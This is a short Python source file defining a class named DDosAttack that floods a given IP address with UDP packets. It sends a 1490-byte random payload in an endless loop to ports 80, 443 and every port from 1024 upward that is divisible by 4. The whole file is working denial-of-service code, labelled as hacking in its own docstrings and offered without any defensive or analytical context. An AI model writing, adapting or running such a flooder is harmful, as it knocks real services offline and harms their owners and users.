"""
Created on Wed Mar  2 18:14:12 2022
@author: SAMIR
"""

import socket
import random

class DDosAttack: 
    """
    simple DDosAttack code
    
    PARAMS:
    ----------
    Constructor: it needs 1 param "ip adress".
    Functions:
        - begin: the function wich called from the main function and begin the program
        - hack: private function used by begin to make the hacking 
    
    OUTPUT:
    ----------
    The begin function don't return anything, it run an infinite loop
    
    RULES:
    ---------
    send request if the port is equal to 80,443, between 1024 and 65534 if the port is divisible by 4
    
    """
    def __init__(self,site):
        """ Constructor """
        self.site = site
        self.port = 1
        self.sent = 0
        self.bytes = random._urandom(1490)
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
    def begin(self):
        """ function to run the hacking. It run an infinite loop """
        while True:
            self.__hack()
            self.port += 1
            if self.port == 65534:
                self.port = 1

            
    def __hack(self):
        """" private function called from begin function """
        if self.port==80 or self.port==443:
            print(self.port)
            self.sock.sendto(self.bytes, (self.site,self.port))
            
        elif (self.port>=1024) and (self.port%4==0):
            print(self.port)
            self.sock.sendto(self.bytes, (self.site,self.port))
        else:
            pass
            
            